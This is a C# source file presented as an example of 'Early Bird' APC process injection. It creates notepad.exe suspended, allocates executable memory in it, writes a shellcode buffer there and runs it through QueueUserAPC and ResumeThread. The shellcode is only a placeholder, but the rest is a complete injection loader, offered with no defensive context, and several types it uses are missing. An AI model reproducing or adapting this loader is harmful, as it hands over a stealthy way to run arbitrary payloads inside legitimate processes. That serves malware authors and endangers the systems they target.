//-------------------------------------------------------
// Author: KrknSec
// Description: Example of Earlybird APC Injection in C#
//-------------------------------------------------------

using System.Runtime.InteropServices;
using System.Security.Permissions;

namespace EarlyBirdAPC
{
    public class EarlyBirdAPC
    {
        [DllImport("kernel32.dll")]
        static extern bool CreateProcess
        (
            string lpApplicationName,
            string lpCommandLine,
            SecurityAttribute lpProcessAttributes,
            SecurityAttribute lpThreadAttributes,
            Boolean bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern IntPtr ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        static void Main()
        {
            unsafe
            {
                // shellcode
                byte[] buf = new byte[]
                {
                0xde,0xad,0xbe,0xef
                };

                // Setup constants for API calls
                const uint MEM_COMMIT = 0x00001000;
                const uint MEM_RESERVE = 0x00002000;
                const uint PAGE_READWRITE = 0x04;
                const uint PAGE_EXECUTE_READWRITE = 0x40;

                // Establish info vars for process
                StartupInfo si = new StartupInfo();
                ProcessInformation pi = new ProcessInformation();

                // Create new process to inject as suspended
                if (!CreateProcess(null, "notepad.exe", null, null, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, si, out pi))
                {
                    Console.WriteLine("[!!] CreateProcessA failed!");
                }

                // Get info from newly created process
                var dwThreadId = pi.dwThreadId;
                var hProc = pi.hProcess;
                var hThread = pi.hThread;

                // Allocate empty memory buffer
                IntPtr bufAddress = IntPtr.Zero;
                bufAddress = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                // Copy shellcode to memory buffer
                //Marshal.Copy(buf, 0, bufAddress, buf.Length);
                int bytesWritten = 0;
                WriteProcessMemory(hProc, bufAddress, buf, buf.Length, ref bytesWritten);

                // Open thread
                IntPtr execThread = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)dwThreadId);

                // Execute with APC
                IntPtr ptr = QueueUserAPC(bufAddress, execThread, IntPtr.Zero);

                // Resume thread
                ResumeThread(hThread);

            }
        }
    }

    public struct StartupInfo
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public struct ProcessInformation
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }

    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }

    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200)
    }
}
